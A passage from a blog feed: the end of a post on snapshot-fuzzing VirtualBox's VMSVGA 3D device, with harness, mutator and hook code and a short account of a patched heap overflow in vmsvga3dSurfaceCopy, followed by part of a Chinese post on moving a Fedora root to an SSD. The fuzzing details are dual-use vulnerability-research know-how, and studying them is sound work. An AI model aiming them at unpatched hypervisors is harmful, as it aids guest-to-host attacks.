<code>vmsvgaR3FifoLoop+4E2</code>. So if I restore register context, next execution flow starts from there. Because of that, I had to parse new testcase using breakpoint Handler.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">const</span> Gva_t SvgaLoopStart = <span class="hljs-built_in">Gva_t</span>(g_Dbg.<span class="hljs-built_in">GetSymbol</span>(<span class="hljs-string">&quot;VBoxDD!vmsvgaR3FifoLoop&quot;</span>) + <span class="hljs-number">0x4e2</span>);<br><span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">Setbreakpoint</span>(SvgaLoopStart, [](Backend_t *Backend) &#123;<br>  <span class="hljs-keyword">if</span>(GlobalState.SvgaCmds.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;testcase deque empty! goto next round...\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> Backend-&gt;<span class="hljs-built_in">Stop</span>(<span class="hljs-built_in">Ok_t</span>());<br>  &#125;<br><br>  <span class="hljs-keyword">auto</span> &amp;Testcase = GlobalState.SvgaCmds.<span class="hljs-built_in">front</span>();<br><br>  <span class="hljs-keyword">while</span> (Testcase.SvgaCmdCode == <span class="hljs-number">1045</span>) &#123;<br>    GlobalState.SvgaCmds.<span class="hljs-built_in">pop_front</span>();<br><br>    <span class="hljs-keyword">if</span>(GlobalState.SvgaCmds.<span class="hljs-built_in">size</span>() == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;testcase deque empty during cmd filtering! goto next round...\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> Backend-&gt;<span class="hljs-built_in">Stop</span>(<span class="hljs-built_in">Ok_t</span>());<br>    &#125;<br><br>    Testcase = GlobalState.SvgaCmds.<span class="hljs-built_in">front</span>();<br>  &#125;<br><br>  Backend-&gt;<span class="hljs-built_in">Rbx</span>(Testcase.SvgaCmdCode);<br><br>  <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;SvgaCmdCode = &#123;:#x&#125;\n&quot;</span>, Testcase.SvgaCmdCode);<br><br>  <span class="hljs-keyword">if</span>(Testcase.SvgaCmdCode &gt;= <span class="hljs-number">1040</span>) &#123;<br>    <br>    <span class="hljs-built_in">DebugPrint</span>(<span class="hljs-string">&quot;Have to avoid AssertBreak(pHdr-&gt;size &lt; pThis-&gt;svga.cbFIFO), write &#123;:#x&#125; on first DWORD\n&quot;</span>, Testcase.SvgaBody.<span class="hljs-built_in">size</span>());<br><br>    <span class="hljs-type">const</span> <span class="hljs-type">uint32_t</span> Svga3dCmdSize = Testcase.SvgaBody.<span class="hljs-built_in">size</span>();<br>    <span class="hljs-keyword">if</span>(Svga3dCmdSize &gt;= <span class="hljs-number">0x200000</span>) &#123;<br>      fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Svga3dCmdSize(&#123;:#x&#125;) &gt; cbFIFO, abort\n&quot;</span>, Svga3dCmdSize);<br>      std::<span class="hljs-built_in">abort</span>();<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="hljs-number">0</span>], &amp;Svga3dCmdSize, <span class="hljs-number">4</span>);<br>    <span class="hljs-built_in">memcpy</span>(&amp;GlobalState.SvgaCmdBody[<span class="hljs-number">4</span>], Testcase.SvgaBody.<span class="hljs-built_in">data</span>(), Testcase.SvgaBody.<span class="hljs-built_in">size</span>());<br>    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="hljs-built_in">size</span>() + <span class="hljs-number">4</span>;<br>  &#125;<br>  <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-built_in">memcpy</span>(GlobalState.SvgaCmdBody, Testcase.SvgaBody.<span class="hljs-built_in">data</span>(), Testcase.SvgaBody.<span class="hljs-built_in">size</span>());<br>    GlobalState.SvgaCmdBodySize = Testcase.SvgaBody.<span class="hljs-built_in">size</span>();<br>  &#125;    <br><br>  GlobalState.SvgaCmds.<span class="hljs-built_in">pop_front</span>();<br>&#125;)) &#123;<br>  fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to Setbreakpoint on SvgaLoopStart\n&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>After some investigation, I found <code>CreateDeviceEx</code> call in <code>vmsvga3dContextDefine</code> keep causing <strong>CR3 context switching</strong> and I didn’t found any way to handling it using breakpoint handler. So I just blacklisting it( <code>SVGA_3D_CMD_CONTEXT_DEFINE</code> &#x3D; <code>1045</code> ).</p><p>I disclose almost every part of fuzz module except mutation part. I just use libfuzzer mutator to mutate body data of SVGA command and pick one of command in array randomly.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-keyword">explicit</span> <span class="hljs-title">CustomMutator_t</span><span class="hljs-params">(std::mt19937_64 &amp;Rng, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> TestcaseMaxSize)</span></span><br><span class="hljs-function">  : Rng_(Rng), TestcaseMaxSize_(TestcaseMaxSize) &#123;</span><br><br>    <span class="hljs-comment">// set maximum size for multiple (mutated) testcase( Default = 1MB )</span><br>    ScratchBuffer__ = std::<span class="hljs-built_in">make_unique</span>&lt;<span class="hljs-type">uint8_t</span>[]&gt;(_1MB);<br>    ScratchBuffer_  = &#123;ScratchBuffer__.<span class="hljs-built_in">get</span>(), _1MB&#125;;<br><br>    BodyMutator_ = <span class="hljs-built_in">make_unique</span>&lt;LibfuzzerMutator_t&gt;(Rng, TestcaseMaxSize);<br>&#125;<br><br><span class="hljs-comment">// skip for brevity...</span><br><br><span class="hljs-function">std::string <span class="hljs-title">Mutate</span><span class="hljs-params">(<span class="hljs-type">uint8_t</span> *Data, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> DataLen, <span class="hljs-type">const</span> <span class="hljs-type">size_t</span> MaxSize)</span> </span>&#123;<br>  <span class="hljs-keyword">auto</span> Root = <span class="hljs-built_in">Deserialize</span>(Data, DataLen);<br>  <span class="hljs-keyword">auto</span> &amp;SvgaCmds = Root.SvgaCmds;<br><br>  <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> &amp;SvgaCmd : SvgaCmds) &#123;<br><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-comment">// 50%</span><br>    <span class="hljs-comment">//</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-number">1</span>) &#123;  <br>      <span class="hljs-type">uint32_t</span> SvgaCmdRandomIdx = <span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, SvgaCmdListLen);<br>      SvgaCmd.SvgaCmdCode = SvgaCmdList[SvgaCmdRandomIdx];<br>    &#125;<br><br>    <span class="hljs-built_in">memcpy</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="hljs-built_in">data</span>(), SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>());<br>    <span class="hljs-type">size_t</span> NewTestcaseSize = BodyMutator_-&gt;Mut_.<span class="hljs-built_in">Mutate</span>(GlobalMutBuffer, SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>(), MaxSize);<br>    SvgaCmd.SvgaBody.<span class="hljs-built_in">resize</span>(NewTestcaseSize);<br>    <span class="hljs-built_in">memcpy</span>(SvgaCmd.SvgaBody.<span class="hljs-built_in">data</span>(), GlobalMutBuffer, NewTestcaseSize);<br>  &#125;<br>  <br>  json::json Serialized;<br>  <span class="hljs-built_in">to_json</span>(Serialized, Root);<br>  <span class="hljs-keyword">return</span> Serialized.<span class="hljs-built_in">dump</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>I also define generator function. It is very useful if you are too lazy to create random input like me ^~^.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">std::string <span class="hljs-title">GenerateTestcase</span><span class="hljs-params">()</span> </span>&#123;<br>  SvgaCmds_t Root;<br>  <span class="hljs-type">const</span> <span class="hljs-keyword">auto</span> N = <span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10</span>);<br><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> Idx = <span class="hljs-number">0</span>; Idx &lt; N; Idx++) &#123;<br>    SvgaCmd_t SvgaCmd;<br>    <br>    SvgaCmd.SvgaCmdCode = SvgaCmdList[<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, SvgaCmdListLen)];<br>    SvgaCmd.SvgaBody.<span class="hljs-built_in">resize</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0x100</span>, <span class="hljs-number">0x400</span>));<br><br>    <span class="hljs-keyword">if</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-number">1</span>) == <span class="hljs-number">0</span>) &#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        SvgaCmd.SvgaBody[i] = <span class="hljs-number">0x41</span>;<br>      &#125;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SvgaCmd.SvgaBody.<span class="hljs-built_in">size</span>(); i++) &#123;<br>        SvgaCmd.SvgaBody[i] = (<span class="hljs-type">uint8_t</span>)<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">0</span>, <span class="hljs-number">255</span>);<br>      &#125;<br>    &#125;<br><br>    Root.SvgaCmds.<span class="hljs-built_in">emplace_back</span>(SvgaCmd);<br>  &#125;<br><br>  json::json Serialized;<br>  <span class="hljs-built_in">to_json</span>(Serialized, Root);<br>  <span class="hljs-keyword">return</span> Serialized.<span class="hljs-built_in">dump</span>();<br>&#125;<br><br><span class="hljs-function">std::string <span class="hljs-title">GetNewTestcase</span><span class="hljs-params">(<span class="hljs-type">const</span> Corpus_t &amp;Corpus)</span> <span class="hljs-keyword">override</span> </span>&#123;<br><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// 20%</span><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-built_in">GetUint32</span>(<span class="hljs-number">1</span>, <span class="hljs-number">5</span>) == <span class="hljs-number">1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">GenerateTestcase</span>();<br>  &#125;<br><br>  <span class="hljs-type">const</span> Testcase_t *Testcase = Corpus.<span class="hljs-built_in">PickTestcase</span>();<br><br>  <span class="hljs-keyword">if</span> (!Testcase) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The corpus is empty, generate random one\n&quot;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">GenerateTestcase</span>();<br>  &#125;<br><br>  <span class="hljs-comment">//</span><br>  <span class="hljs-comment">// Copy the input in a buffer we&#x27;re going to mutate.</span><br>  <span class="hljs-comment">//</span><br><br>  <span class="hljs-built_in">memcpy</span>(ScratchBuffer_.<span class="hljs-built_in">data</span>(), Testcase-&gt;Buffer_.<span class="hljs-built_in">get</span>(),<br>         Testcase-&gt;BufferSize_);<br><br>  <span class="hljs-comment">// return Mutate(ScratchBuffer_.data(), Testcase-&gt;BufferSize_, TestcaseMaxSize_);</span><br>  <br>  <span class="hljs-keyword">return</span> <span class="hljs-built_in">Mutate</span>(ScratchBuffer_.<span class="hljs-built_in">data</span>(), Testcase-&gt;BufferSize_, u32PbBounceBufMaxSize - <span class="hljs-built_in">sizeof</span>(<span class="hljs-type">uint32_t</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>Aaaaannnd, this is everything you need to fuzz! I skip some formal code for brevity, but I think you can easily find what you need to define fully working fuzz module.</p><p>…..Ooooh wait, I forgot something. After some hours of struggle, I define a blacklist which cause CR3 context switching. I just put it on the end of <code>Init()</code> function.</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">SetupVBoxBlacklistHooks</span><span class="hljs-params">()</span> </span>&#123;<br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxRT!RTLogLoggerEx&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxRT!RTLogLoggerEx\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxVMM!PDMCritSectLeave&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxVMM!PDMCritSectLeave\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxC!util::AutoLockBase::release&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::release\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxC!util::AutoLockBase::acquire&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxC!util::AutoLockBase::acquire\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VirtualBoxVM!UIFrameBufferPrivate::NotifyChange&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VirtualBoxVM!UIFrameBufferPrivate::NotifyChange\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;VBoxRT!SUPSemEventWaitNoResume&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on VBoxRT!SUPSemEventWaitNoResume\n&quot;</span>);<br>    std::<span class="hljs-built_in">abort</span>();<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CBaseDevice::Release&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CBaseDevice::Release\n&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CD3DBase::Clear&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CD3DBase::Clear\n&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CMipMap::SetAutoGenFilterType&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::SetAutoGenFilterType\n&quot;</span>);<br>  &#125;<br>  <br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;d3d9!CMipMap::GenerateMipSubLevels&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on d3d9!CMipMap::GenerateMipSubLevels\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">if</span>(!g_Backend-&gt;<span class="hljs-built_in">SetBreakpoint</span>(<span class="hljs-string">&quot;USER32!GetDC&quot;</span>, [](Backend_t *Backend) &#123;<br>    Backend-&gt;<span class="hljs-built_in">SimulateReturnFromFunction</span>(<span class="hljs-number">0x1337</span>);<br>  &#125;)) &#123;<br>    fmt::<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Failed to SetBreakpoint on USER32!GetDC\n&quot;</span>);<br>  &#125;<br><br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>Yep. That’s really everything. I use this fuzz module several hours and it founds interesting crash.</p><h1 id="3-Vulnerability-TL-DR"><a href="#3-Vulnerability-TL-DR" class="headerlink" title="3. Vulnerability( TL;DR )"></a>3. Vulnerability( TL;DR )</h1><p>Crash occurred in <code>vmsvga3dSurfaceCopy</code> function( <strong>PageHeap</strong> needed ).</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah2.png" alt="blahblah2"></p><p>This function trying to copy surface data from one to another using surface id and there’s no boundary check between surface, so it become exploitable wildcopy vulnerability in heap memory.</p><p><img src="https://github.com/henices/pictures/raw/master/wtf-vbox-blahblah3.png" alt="spot the bug"></p><p>This vulnerability patched in <a href="https://www.oracle.com/security-alerts/cpujul2022.html">6.1.36 release</a> at July, 2022.</p><h1 id="4-Conclusion"><a href="#4-Conclusion" class="headerlink" title="4. Conclusion"></a>4. Conclusion</h1><p>I think importance of snapshot fuzzing is, it makes researcher to focus on target itself. </p><p>Unlike other fuzzers based on runtime and DBI are often create (very) unreasonable side effect or need lots of time to create working harness. The concept of snapshot fuzzing makes it possible to reduce this waste of time.</p>]]></content>
    
    
    
    <tags>
      
      <tag>Archives</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSD 迁移记</title>
    <link href="/cn/ssd/"/>
    <url>/cn/ssd/</url>
    
    <content type="html"><![CDATA[<p>由于某些需求，决定上SSD，提高一下硬盘读写速度。上二手东买了三星(SAMSUNG) 860 EVO 最初的想法是作为数据盘使用，即操作系统还是跑在机械硬盘上，仔细一思考，还是折腾一下，要不实在是有些浪费，事实证明，折腾是值得的，感觉就像飞一样。</p><p>首先查看一下磁盘原始的情况：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ mount<br><br>/dev/sda1 on /boot <span class="hljs-built_in">type</span> ext4 (rw,relatime,seclabel,stripe=4)<br>/dev/mapper/fedora-root on / <span class="hljs-built_in">type</span> ext4 (rw,relatime,seclabel)<br></code></pre></td></tr></table></figure><p>当然首先要把 SSD 处理一下，安装一下 <code>gparted</code> 图形化界面很好用。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">sudo dnf install gparted<br></code></pre></td></tr></table></figure><p>建个分区表，选择 gpt，分个区，<code>/dev/mapper/fedora-root</code> 大小为50G，先分个50G的分区，剩下的全部给 另外一个分区，格式化为 ext4。操作完成后，用fdisk 查看一下：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sh">$ fdisk -l<br><br>Disk /dev/sdb：232.9 GiB，250059350016 字节，488397168 个扇区<br>单元：扇区 / 1 * 512 = 512 字节<br>扇区大小(逻辑/物理)：512 字节 / 512 字节<br>I/O 大小(最小/最佳)：512 字节 / 512 字节<br>磁盘标签类型：gpt<br>磁盘标识符：<br><br>设备            起点      末尾      扇区   大小 类型<br>/dev/sdb1       2048 104859647 104857600    50G Linux 文件系统<br>/dev/sdb2  104859648 488396799 383537152 182.9G Linux 文件系统<br></code></pre></td></tr></table></figure><p>将原来系统的 &#x2F; dd 到新的SSD 的 <code>/dev/sdb1</code></p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh"><span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=/dev/mapper/fedora-root of=/dev/sdb1 bs=1M<br></code></pre></td></tr></table></figure><p>用新的 root 把系统启动起来，reboot 后进入引导界面，按e 编译，找到 root&#x3D;&#x2F;dev&#x2F;fedora&#x2F;root 改为 root&#x3D;&#x2F;dev&#x2F;sdb1 按 ctrl+x 启动，一会儿就进系统了，速度提升很大。现在需要把 grub.cfg 更新一下，因为我们是手动修改进入了新的根，如果重启的话，还是会使用老的根，因为grub.cfg 里就是这么写的。</p><p>要生成新的grub.cfg 需要使用grub2-mkconfig, 命令很简单</p><p><code>$ grub2-mkconfig -o /boot/grub2/grub.cfg</code></p><p>执行命令后重启，md 怎么又进到老根去了。</p><p>这里折腾了好久，第一个问题Fedora 的内核出bug 了，每次重启都要等待非常久的时间，所以正确的顺序应该是先升级系统再 dd 。解决了Fedora 内核的问题后，发现还是进不到新根。认真地查看 grub.cfg 内容, grub2 改动挺大，不太熟悉了。</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs gradle">#<br># <span class="hljs-keyword">DO</span> NOT EDIT <span class="hljs-keyword">THIS</span> <span class="hljs-keyword">FILE</span><br># It is automatically generated by grub2-mkconfig using templates<br># <span class="hljs-keyword">from</span> <span class="hljs-regexp">/etc/g</span>rub.d and settings <span class="hljs-keyword">from</span> <span class="hljs-regexp">/etc/</span><span class="hljs-keyword">default</span>/grub<br></code></pre></td></tr></table></figure><p>启动有两个信息，确实是使用 grub2-mkconfig 生成，&#x2F;etc&#x2F;default&#x2F;grub 里有默认配置</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs routeros">$ cat /etc/default/grub<br><br><br><span class="hljs-attribute">GRUB_TIMEOUT</span>=5<br><span class="hljs-attribute">GRUB_DISTRIBUTOR</span>=<span class="hljs-string">&quot;<span class="hljs-variable">$(sed &#x27;s, release .*$,,g&#x27; /etc/system-release)</span>&quot;</span><br><span class="hljs-attribute">GRUB_DEFAULT</span>=saved<br><span 